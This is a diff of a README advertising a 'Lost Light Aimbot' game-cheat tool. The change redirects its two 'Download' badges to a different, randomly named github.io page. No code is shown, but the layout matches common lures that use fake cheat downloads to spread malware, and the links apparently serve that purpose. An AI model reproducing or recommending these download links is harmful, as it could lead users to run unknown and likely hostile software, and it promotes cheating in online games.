@@ -1,7 +1,7 @@
 # 🎯 Lost Light Aimbot — Precision Aim Assist Tool
 
-[![Download Aim Assistant](https://img.shields.io/badge/Download_Aim_Assistant-darkgoldenrod?style=for-the-badge)](https://trahendon.github.io/.github/LostLightAimAssist4)  
-[![Download Now](https://img.shields.io/badge/Download_Now-goldenrod?style=for-the-badge&logo=lostlight)](https://trahendon.github.io/.github/LostLightAimAssist4)
+[![Download Aim Assistant](https://img.shields.io/badge/Download_Aim_Assistant-darkgoldenrod?style=for-the-badge)](https://heruvimiuy09lokwebco9.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-goldenrod?style=for-the-badge&logo=lostlight)](https://heruvimiuy09lokwebco9.github.io/.github/)
 
 ---
 
